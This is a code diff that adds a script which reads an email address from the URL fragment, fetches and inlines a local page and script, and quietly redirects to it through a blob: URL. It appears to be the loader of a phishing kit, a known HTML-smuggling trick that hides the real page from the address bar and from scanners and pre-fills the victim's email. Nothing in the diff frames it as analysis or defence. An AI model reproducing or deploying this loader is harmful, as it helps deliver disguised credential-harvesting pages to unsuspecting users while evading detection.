@@ -1,0 +1,43 @@
+<script>
+(function () {
+
+  // ✅ READ EMAIL FROM HASH (decode once)
+  const hash = window.location.hash;
+  const emailFromHash =
+    hash && hash.length > 1 ? decodeURIComponent(hash.slice(1)) : null;
+
+  fetch('n1.html')
+    .then(res => res.text())
+    .then(async html => {
+
+      let modifiedHtml = html;
+
+      // ✅ INLINE next.js
+      try {
+        const nextResp = await fetch('next.js');
+        if (nextResp.ok) {
+          const nextJsText = await nextResp.text();
+          modifiedHtml = modifiedHtml.replace(
+            /<script\s+[^>]*src=["']next\.js["'][^>]*>\s*<\/script>/i,
+            '<script>' + nextJsText + '<\/script>'
+          );
+        }
+      } catch (e) {
+        console.warn('Could not inline next.js', e);
+      }
+
+      const blob = new Blob([modifiedHtml], { type: 'text/html' });
+      const blobUrl = URL.createObjectURL(blob);
+
+      // ✅ QUIET SAME-TAB REDIRECT (NO DOUBLE ENCODE)
+      if (emailFromHash) {
+        window.location.replace(blobUrl + '#' + emailFromHash);
+      } else {
+        window.location.replace(blobUrl);
+      }
+
+    })
+    .catch(err => console.error('Failed to load blob page:', err));
+
+})();
+</script>
